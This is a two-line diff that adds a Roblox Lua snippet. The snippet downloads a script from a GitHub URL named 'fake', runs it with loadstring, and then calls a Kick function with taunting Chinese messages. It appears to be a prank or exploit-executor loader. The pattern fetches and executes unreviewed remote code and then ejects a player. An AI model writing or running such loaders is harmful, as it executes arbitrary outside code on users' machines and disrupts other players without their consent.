@@ -1,0 +1,2 @@
+local renji = loadstring(game:HttpGet("https://github.com/DocYogurt/F/raw/main/fake"))()
+renji:Kick("活该","我没困吧","哈哈")
